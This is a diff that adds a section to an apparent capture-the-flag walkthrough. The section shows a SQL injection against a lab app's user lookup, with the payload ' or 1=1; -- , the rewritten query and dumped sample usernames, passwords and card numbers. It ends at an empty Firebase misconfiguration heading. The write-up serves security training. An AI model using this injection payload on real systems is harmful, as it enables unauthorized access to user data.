@@ -250,3 +250,28 @@ Write into payload the classic
 ```
 
 The flag appears behind the send `0x66r9214`
+
+## Flag 8 - SQL Injection
+
+Try to execute SqlInjection.
+
+The request is something like, to check user:
+
+```sql
+SELECT * FROM users WHERE username='<NAME>'; 
+```
+If we try the following name `' or 1=1; -- `:
+
+```sql
+SELECT * FROM users WHERE username='' or 1=1; -- '; 
+```
+=>
+
+```text
+User: (admin) pass: (passwd123) Credit Card: (1234567812345678)
+User: (beetle-bug) pass: (flg) Credit Card: (0x91334Z1)
+```
+
+Flag => `0x91334Z1`
+
+## Flag 9 - Firebase Database Misconfiguration
